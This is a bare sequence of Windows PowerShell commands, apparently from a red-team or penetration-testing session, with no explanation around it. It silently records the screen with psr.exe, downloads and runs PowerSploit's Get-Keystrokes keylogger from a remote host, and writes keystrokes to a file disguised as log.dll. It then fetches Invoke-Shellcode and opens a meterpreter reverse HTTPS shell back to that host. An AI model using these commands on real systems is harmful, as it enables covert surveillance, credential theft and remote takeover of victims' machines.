psr.exe /start /gui 0 /output C:\Windows\Temp\cap.zip
IEX (New-Object Net.WebClient).DownloadString('http://10.101.101.16/powersploit/Exfiltration/Get-Keystrokes.ps1')
Get-Keystrokes -LogPath C:\Windows\Temp\log.dll
Start-Sleep -s 30
psr.exe /stop
(Get-Runspace 2).close()
IEX (New-Object System.Net.WebClient).DownloadString("http://10.101.101.16/powersploit/CodeExecution/Invoke-Shellcode.ps1"); Invoke-Shellcode -payload windows/meterpreter/reverse_https -lhost 10.101.101.16 -lport 9999 -force